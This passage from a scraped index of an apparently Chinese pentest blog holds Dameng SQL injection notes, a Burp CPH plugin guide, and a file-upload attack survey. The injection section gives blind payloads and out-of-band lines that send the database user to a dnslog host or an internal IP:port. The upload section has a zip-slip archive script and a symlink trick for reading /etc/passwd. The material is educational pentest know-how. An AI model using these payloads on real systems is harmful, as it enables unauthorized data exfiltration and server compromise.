ELSE state2 END -- 同IF DECODE(expr, search1, result1 [, search2, result2,...][, default_result]) -- 类似 switch case, 如果 expr=search1，则返回 result1，否则返回default_result IFNULL(expr1,expr2) -- 如果 expr1 不为 NULL，则返回 expr1，否则返回 expr2 NULLIF(expr1,expr2) -- 若expr1与expr2不同，则返回expr1，否则返回NULL if(1=ascii(substr('123456',2,1)),2, 1) -- 综合使用，盲注必备 CASE WHEN len(user)=6 THEN 1 ELSE 0 END DECODE(len(user),6,1,0) -- 判断len(user)=6是否成立，成立返回1，否则返回0 案例： SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=if(len(user)=6,1,0) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=(case when len(user)=4 then 1 else 0 end) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=decode(len(user),6 ,1,0) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=IFNULL(len(user)=6,0) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=NULLIF(len(user)=6,0) ORDER BY id DESC; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:8:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x08 时间盲注 sleep(n) -- 休眠n秒，不能和select 一起用，语法错误，失去价值 exec sleep 5 -- 延时5s dbms_pipe.receive_message(('a'),2) -- 可以延时 SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; -- 如果反查很慢，可能可以 SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; -- 如果正查很慢 SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; -- 如果发送TCP包被拦截或者很慢 实际过程中时间盲注很难起到作用。测试发现，结合布尔判断时，无论True/False，都会造成延时。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:9:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x09 DNS外带注入 需要用户可访问网络的权限 如果数据长度太长，如数据库版本，可能会导致出错，这时候要使用带外，就可以使用substr()函数来截取字符串，每次取几个特定的字符即可 发送DNS请求，DNS外带： SELECT UTL_INADDR.get_host_address('google.com') FROM dual; -- priv SELECT UTL_INADDR.get_host_address((select user)||'.xxx.dnslog'); SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; SELECT UTL_HTTP.REQUEST('http://xxx.dnslog?'||(select user)) from dual; select utl_http.request('http://192.168.0.100:8888/?'||(select user)) from dual; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:10:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x0A 堆叠注入 在靶场中没成功，提示表不存在，但是在实战中成功过。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:11:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"10.1 结合DNS外带 结合DNS外带注入，成功获取到数据。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:11:1","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"10.2 结合除0报错 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:11:2","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x0B order by 位置注入 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"11.1 位运算符 主要使用^亦或运算，其他也可 ORDER BY id^(if(1=2,1,2) ORDER BY id^(if(len(user)=6,1,2)) SELECT * FROM t1 where rownum\u003c5 ORDER BY id^(if(1=2,1,2)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id^(if(len(user)=6,1,2)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id\u0026(if(len(user)=6,1,2)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id|(if(len(user)=6,1,2)) DESC; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:1","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"11.2 union 利用条件比较苛刻，需要整条语句在括号中，且前后字段数量一致 (SELECT * FROM t1 where rownum\u003c5 ORDER BY id) union (select 1,2,user); (SELECT * FROM t1 where rownum\u003c5 ORDER BY id,null) union (select 1,2,user); ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:2","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"11.3 转化成Where 将其转化为 where 后的注入点 SELECT * FROM xxxx WHERE is_delete != '1' ORDER BY id limit 0,20 SELECT * FROM xxxx WHERE is_delete != '1' ORDER BY (select 1 from dual where 1=1/(case when len(user)=6 then 1 else 0 end)) LIMIT 0,20 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:3","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x0C limit 注入 可以接 堆叠注入 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:13:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"END 参考文章 达梦数据库手工注入笔记：https://mp.weixin.qq.com/s/vWt3aHhji7e64EMGEBXigg 达梦技术文档：https://eco.dameng.com/document/dm/zh-cn/pm/logical-structure.html ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:14:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Tools"],"content":"Burp插件 CPH（Custom Parameter Handle）使用心得","date":"2024-11-13","objectID":"/posts/burp-cph-usage/","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"#tools/Burp/Burp-plug ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:0:0","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"简介 CPH：Custom Parameter Handler extension for Burp Suite. Burp Suite 的自定义参数处理扩展：一款用于精准修改HTTP消息的工具。 CPH 提供了一种简单的方法来修改 HTTP 消息的任何部分，即使使用宏也可以进行精确的操作。通常，宏仅支持 HTTP 参数（name=value），但使用此扩展可以定位任何内容。 功能： 根据范围和模式匹配，自动修改请求和响应。 查找和替换，完全支持 RegEx。 范围限定到特定的 Burp Suite 工具。 指定特定匹配项（仅第一个、所有匹配项或手动选择）。 支持修改动作的连接和排序，以及根据先前的响应进行下一项修改的能力。 保存/加载配置： 快速保存/快速加载（在 Burp/Extender 会话之间持续存在）。 从 JSON 文件导入/导出。 运行宏后，从其最终响应中提取替换值。 修改宏中的每个请求/响应。 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:1:0","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"CPH VS 宏： CPH的优势： CPH 可以处理 HTTP 消息的任何部分 宏只能动态派生格式为name=value的参数；即它不能对 JSON、RESTful（如/user/123）或任何其他序列化等格式进行操作。 CPH 可以修改请求和/或响应 宏只能修改请求 CPH 将所有必要的配置集中到了一起 宏需要额外配置会话处理规则（session handling rules） CPH 可以检查 HTTP 消息的任何部分，以确定其是否应在范围内 宏依赖于触发它们的会话处理规则中设置的范围，并且此范围仅限于协议、主机、端口和路径 CPH的难点： 正则表达式的编写 日志不够详细 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:1:1","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"问题场景 解决CSRF Token 解决随机字符串 解决流程化操作 CSRF Token： CSRF Token 比较好理解，每次访问网页，服务器会随机返回一个CSRF Token在前端界面中，下一步请求包中需要使用该Token，该工具可以自动化提取该Token并进行替换，让每次发送的CSRF Token都是有效的。 随机字符串： 这种情况下的可能的场景有： 请求某个接口，服务端返回一个随机 key，下一个请求包需要使用该key才能访问下一个接口获取数据。 登录过程有验证码回显，获取验证码的值，再进行登录 其实上述的常见本质上都是一样的。 流程化操作： 类似Burp自带的宏，宏中可以进行 key1=value2\u0026key2=value2 形式的数据替换，但不支持JSON等其他格式，该工具可以完成相应的动作。 该工具可以作为宏的替代或补充。 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:1:2","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"UI 介绍 本文的介绍基于BurpSuite 商店 BApp Store 中的 CPH V3.0a 版本。 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:2:0","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"1、Options页面 首先，首次加载时默认只有一个Options页面，如下所示： 左上角依次是： verbosity level，日志输出的详细程度，默认是 3 INFO 级别，输出的内容可在 Burp Extensions中查看 Quicksave/Quickload：快速保存/快速加载（在 Burp/Extender 会话之间持续存在） Export Config / Import Config：从 JSON 文件导入/导出CPH选项卡配置文件 Visit Wiki： 访问Github Wiki Show EMV：打开修改查看器 (EMV)页面 Running built-in httpd on 127.0.0.1:9001：启动内置的测试用例 右上角是 Tool scop settings：用于控制工具生效的范围。 下方是 版面最大Quickstart guide，这块就不提了。 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:2:1","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"2、选项卡 从上往下依次是： \u003c \u003e ：左右箭头，用来调整当前选项卡的位置，前移或后移 Clone 按钮：克隆当前选项卡到新选项卡 Friendly Name： 当前标签卡名称，可自定义修改 第二块内容是范围 Scoping： 用于指定当前选项卡的生效范围，首先需要确保 URL 在Burpsuite的范围中。 on all requests # 全部请求包 on all responses # 全部请求包 on all requests and responses # 全部请求包与响应包 only on requests only on responses only on requests and responses 这三种需要配置正则，只在满足匹配条件的URL上执行当前选项卡 第三块内容是参数处理 Parameter handing Automatically URL-encode the first line of the request, if modified（修改后自动对请求的第一行进行 URL 编码） Change the destination of the request。更改请求包的去向，重定向到另一个ip或域名 1）Find matches to this expression：（查找与此表达式匹配的内容） 2）Target the first/each/a subset of the matches：（选择 第一个/每个/集合中的 匹配项）subset集合详见 定位匹配 说明。 3）Replace each target with this expression: （用以下表达式替换每个目标：） 启用“RegEx”时，将处理转义序列和组引用。后面输入框中写正则表达式。 The value I need is dynamic（我需要的值是动态的），如果勾选这一项，将打开4）功能 4）In the expression above, refer to the named RegEx groups you’ll define below in order to insert:（在上面的表达式中，请参考下面定义的 RegEx 命名组以插入：） 下拉列表中有3种模式： values returned by issuing a single request，通过发出单个请求返回的值 values returned by issuing a sequence of requests，通过发出一系列请求返回的值 values in the cached response of a previous CPH tab，前一个 CPH 选项卡的缓存响应中的值 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:2:2","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"用法 具体用法可以参考 burp-cph-wiki 给了相应的教程，花点时间就能学会理解并使用，但是这款工具需要具备正则表达式的编写能力。 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:0","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"明确范围 CPH 只会针对 Burp Suite 范围内的消息。 ⚠️如果请求/响应不在 Burp 的范围内，CPH 将忽略它⚠️ 需要先把目标网站添加到 Burp 的 Target列表中。 我平时一般不怎么用Target这项功能，因此觉得有点多余 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:1","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"有效修改查看器 (EMV) EMV 显示每个选项卡对 HTTP 消息的最终修改的差异，并可以有效帮助您微调 CPH 配置。 ℹ️请注意，EMV 选项卡将仅显示由 CPH 中相应选项卡修改的消息。 也就是说如果通过Session handling rules调用的具体修改是看不到的。 而且EMV感觉好像有Bug，只能查看最开始的一个包 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:2","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"1.字符串查找替换 CPH 允许在请求或响应中找到目标字符串，然后用新的所需值替换目标字符串。 您想要的值可能来源于： 正则表达式 CPH 实时发出的请求的响应 Burp 宏的最终响应 上一个 CPH 选项卡的缓存响应 文本匹配 最简单的查找替换就是文本匹配模式，例如： hello xiaoming --\u003e hello xiaohong 即 交互式案例1： I do not speak like Yoda! I do not speak like Mr. Mackey, m'kay? 正则匹配 利用正则进行匹配，支持正则分组语法。 利用正则分组，调整语句，如： # 交互式案例2，注意正则的写法 I do not speak like Yoda Speak like Yoda, I do not! 定位匹配 这是一个很有意思的设计，与Python切片类似。 如果某个特定匹配在给定的 HTTP 消息中出现多次，则可以定位特定匹配，但并非所有匹配都应该修改。 负值有效。无效值（例如字母）将被忽略。支持0:3,-1这种写法，表示对前3个和最后1个匹配项进行替换。 选择：Target a subset of the matches # 交互式案例4，注意定位匹配的写法 # 匹配 [ ] 符号，选择其中的0,4,8 进行替换 ## 原响应： [0][ ]1st [1][ ]2nd [2][ ]3rd [3][ ]4th [4][ ]5th [5][ ]6th [6][ ]7th [7][ ]8th [8][ ]9th ## 预期响应： [0][X]1st [1][ ]2nd [2][ ]3rd [3][ ]4th [4][X]5th [5][ ]6th [6][ ]7th [7][ ]8th [8][X]9th ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:3","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"2.替换动态值 发出单独的请求以使用其响应中的动态值 如果需要发出单独的请求以提取要使用的新值（例如，CSRF令牌），且必要的请求已经存在于Burp Suite的其他地方（例如，Target，Proxy，Repeater等），只需右键单击所述请求并选择发送到CPH。 否则，创建一个 CPH 选项卡并： 勾选：我需要的值是动态（The value I need is dynamic） 在下拉菜单中选择：发出单个请求返回的值（values returned by issuing a single request） 然后，将请求复制/粘贴（或手动输入）到左侧窗格中。 这块 UI 有点小问题，如果只看到响应包框的话，可以 找到三个点 位置看能不能调整大小。 最后，配置一个适当的表达式以便从相关响应中提取值。 # 交互式案例4，注意正则的写法 # 从响应包中匹配返回值：(?P\u003cnumber\u003e\\d{1,5})$，并在请求包中进行替换 /1/\\g\u003cnumber\u003e ## 原响应： Try again! New number: \u003crandom number\u003e ## 预期响应： \u003cnumber\u003e was correct! New number: \u003crandom number\u003e ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:4","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"3. 宏 VS CPH 利用CPH 实现 Burp 宏的功能。 案例场景： 校验随机Cookie，访问请求： 访问 /number，获取校验码 value； 访问/cookie，设置cookie 配置 Cookie: number=\u003cvalue\u003e，使用POST请求，访问 /number，修改number值。 POST /number HTTP/1.1 Host: 127.0.0.1:9001 Content-Length: 10 Cookie: number=\u003cvalue\u003e number=123 在这个场景下，Burp宏 与 CPH 都可以实现。 Burp的配置文件： Burp 宏文件和 Burp Session rules文件 CPH 配置文件： CPH config file ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:5","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"4. Burp 宏结合 CPH 案例场景： 按照以下流程进行校验： 访问 /number，获取第一个校验码 value1； 访问/1?number=\u003cvalue1\u003e，获取第二个校验码 value2； 访问/2?number=\u003cvalue2\u003e，获取第三个校验码 value3； 访问/3?number=\u003cvalue3\u003e，获取第四个校验码 value4； 访问/check/\u003cvalue4\u003e 通过最终的校验。 其中1-4步都可以通过Burp 宏解决，最后一步宏无法完成，需要使用CPH进行替换。 Burp的配置文件：此 Burp 宏文件和此 Burp 规则文件 CPH 配置文件：CPH config file ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:6","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"5. 利用缓存响应 案例场景： 按照以下流程进行校验： 访问 /number，获取第一个校验码 value1； 访问/1/\u003cvalue1\u003e，通过校验后获取新校验码 value2； 访问/2/\u003cvalue2\u003e，通过校验后获取新校验码 value3； 访问/3/\u003cvalue3\u003e，通过校验后获取新校验码 value4。 访问/check/\u003cvalue4\u003e 通过最终的校验。 上述场景下，Burp宏无法实现校验码的替换，可以利用CPH的缓存响应功能进行实现。 勾选： 我需要的值是动态（The value I need is dynamic） 在下拉列表中选择：上一个 CPH 选项卡的缓存响应中的值 （values in the cached response of a previous CPH tab） Burp的配置文件：此 Burp 宏文件和此 Burp 规则文件 CPH 配置文件：CPH config file ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:7","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"6. CPH 代替 宏 https://github.com/elespike/burp-cph/wiki/09.-CPH-as-an-alternative-to-macros 案例场景： 按照以下流程进行校验： 访问 /number，获取第一个校验码 value1； 访问/1/\u003cvalue1\u003e，通过校验后获取新校验码 value2； 访问/2/\u003cvalue2\u003e，通过校验后获取新校验码 value3； 访问/3/\u003cvalue3\u003e，通过校验后获取新校验码 value4。 访问/check/\u003cvalue4\u003e 通过最终的校验。 这里的案例场景与5一样，但是这次不使用宏和缓存响应功能，纯粹依靠CPH进行实现。 CPH 配置文件：CPH config file CPH 进行范围匹配，会自动篡改标签中定义范围内的数据，因此它的调用逻辑是逆序的，如下所示： 监测到用户访问/check/\u003cvalue\u003e ，其中\u003cvalue\u003e值是动态的来自/3/\u003cvalue\u003e，于是去请求/3/\u003cvalue3\u003e 监测到访问/3/\u003cvalue\u003e，其中\u003cvalue\u003e值是动态的来自/2/\u003cvalue\u003e，于是去请求/2/\u003cvalue3\u003e 监测到访问/2/\u003cvalue\u003e，其中\u003cvalue\u003e值是动态的来自/1/\u003cvalue\u003e，于是去请求/1/\u003cvalue3\u003e 监测到访问/1/\u003cvalue\u003e，其中\u003cvalue\u003e值是动态的来自/number，于是去请求/number 请求/number 获取动态值，并替换给/1/\u003cvalue\u003e，后面也是如此依次进行。 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:8","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"6. 正则表达式 RegEx 标志 在模式的开头，您可以按如下方式指定正则表达式标志： (?Limuxs) L：取决于语言环境（locale dependent） i: 忽略大小写 m：多行 u: unicode x：详细 s:.匹配所有内容（通常不匹配\\n） 前瞻和后瞻断言 CPH 支持正向/负向 前瞻和后瞻断言 正向前瞻断言：\\d{5}(?=00000)，改为负向前瞻断言 ：\\d{5}(?!00000) 正向后瞻断言：(?\u003c=00000)\\d{5}，改为负向后瞻断言 ： ，(?\u003c!00000)\\d{5} ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:9","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"快捷键 虽然感觉没啥必要，但是还是写一下 Ctrl+N 创建新标签页 Ctrl+Shift+N 克隆当前标签 Ctrl+W 关闭当前标签 Ctrl+E 启用/禁用当前选项卡 Ctrl+, 选择上一个标签 Ctrl+. 选择下一个标签 Ctrl+Shift, 向后移动标签 Ctrl+Shift. 向前移动标签 ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:10","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"JSON测试用例 个人编写的一个简单测试 案例场景： 从上一个响应包中提取所需的JSON数据，赋值给目标请求的相应JSON参数。 测试代码： from flask import Flask, request, jsonify import requests import random from flask_caching import Cache app = Flask(__name__) cache = Cache(app, config={'CACHE_TYPE': 'simple'}) @app.route('/api1', methods=['GET']) def api1(): result = random.randint(1, 100) cache.set('result', result) return jsonify({\"验证码\": result,\"yzm\": result, \"message\": \"success\"}) @app.route('/api/check', methods=['POST']) def api4(): data = request.get_json() if data is None or 'index' not in data: return jsonify({\"error\": \"Invalid JSON data or missing 'index' field\"}) index = int(data['index']) result_from_api1 = int(cache.get('result')) if index == result_from_api1: return jsonify({\"message\": \"check successfully!\"}) else: return jsonify({\"message\": \"invaild value!\"}) if __name__ == '__main__': app.run(debug=True) 配置： Parameter handling: # 1) Find matches to this expression: {\"index\": 123} # 3) Replace each target with this expression: {\"index\": \\g\u003cnumber\u003e} # 4) In the expression above, refer to the named RegEx groups you'll define below in order to insert: \"\\\\u9a8c\\\\u8bc1\\\\u7801\"\\: (?P\u003cnumber\u003e\\d{1,5})\\n\\}\\n ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:4:0","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"参考 项目地址：https://github.com/elespike/burp-cph/ wiki地址：https://github.com/elespike/burp-cph/wiki Burp Suiteの拡張機能 Custom-Request-Handlerを作成しました ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:5:0","tags":["Tools"],"title":"Burp-CPH插件心得","uri":"/posts/burp-cph-usage/"},{"categories":["Pentest"],"content":"简述一些文件上传场景下的攻击面，并提供一些漏洞案例。","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.1. 前言 本文主要介绍文件上传功能点有哪些攻击面。 整理的有点粗糙，将就看吧。 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:1:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.2. 允许直接上传shell 只要有文件上传功能，那么就可以尝试上传shell直接执行恶意代码，获得服务器权限，这是最简单也是最直接的利用。 上传shell包括Webshell、脚本文件、代码文件等 Java/JSP 后缀 jsp jsw jsv jspa jspf jspx jhtml PHP后缀： php php2 php3 php4 php5 php6 php7 pht inc phps phar pgif phtm phtml shtml html htm ASP.NET 后缀 asp asa svc rem axd asax ascx asmx cer aspx ashx aspq soap xamlx cshtm vbhtm cshtml vbhtml Apache SSI上传 stm shtm shtml 其他： pl pm sh cfm cgi lib ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:2:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.3. 允许上传压缩包 ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:0","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"ZipSlip/Traversal 如果可以上传压缩包，并且服务端会对压缩包解压，那么就可能存在ZipSlip/Traversal目录穿越漏洞； 通过构造一个压缩包中带有../的压缩文件，上传后交给服务端应用程序进行解压，如果程序解压时没有对压缩包内的文件名进行合法性校验，而是直接将文件名拼接在待解压目录后面，导致可以将文件解压到正常解压缩路径之外，可能导致恶意文件的写入、覆盖替换可执行文件等，等待系统或用户调用恶意文件，从而实现代码执行（也可能是覆盖配置文件或其他敏感文件）。 可能的压缩包格式后缀包括： tar jar war cpio apk rar 7z 本质： 没有对压缩包中的文件名进行合法性校验，直接将文件名拼接到待解压目录中，导致存在路径遍历风险。 举例： 若解压目录为/webapp/web/，给文件命名为：../../var/www/html/1.php并压缩，那么文件解压后，通过直接拼接文件名为/webapp/web/../../var/www/html/1.php，因此最终就会存放到/var/www/html/1.php中，如果能访问并解析，那么就能成功代码执行。 利用： zip-slip-vulnerability 项目包含了有关此攻击的所有信息，例如受影响的库、项目和其他相关信息。 构造代码： 也可以用别人写好的工具：https://github.com/ptoomey3/evilarc import zipfile # the name of the zip file to generate zf = zipfile.ZipFile('out.zip', 'w') # the name of the malicious file that will overwrite the origial file (must exist on disk) fname = 'zip_slip.txt' #destination path of the file zf.write(fname, '../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa') ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:1","tags":["Pentest","FileUpload"],"title":"文件上传攻击面\u0026案例","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"Symlinks attack tar/zip 允许压缩包中包含符号链接。符号链接是一种链接到另一个文件的特殊文件。通过上传包含符号链接的 ZIP，并在解压 ZIP 后，可以通过访问符号链接以访问到原本无法访问的文件。为此，需要让符号链接指向 Web 根目录之外的文件，例如“/etc/passwd”。 这些类型的问题通常是在开发人员允许上传 ZIP 文件时发现的。当用户在应用程序中上传恶意 ZIP 文件时，它只会获取 ZIP 文件并将其提取出来，而不会进行任何进一步的验证。 例如： facebook 本地文件读取 CVE-2016-9086-读取应用服务器上的文件，导致 RCE 1. 创建一个符号链接文件指向/etc/passwd ln -s /etc/passwd link 2. 压缩文件，同时保留链接 zip --symlinks test.zip link 3. 上传test.zip文件，系统会自动解压缩 4. 页面当中会返回/etc/passwd的内容 这里是通过绝对路径读取文件，还有可能是相对路径。 参考：https://secops.group/anatomy-of-a-file-upload-attack/ 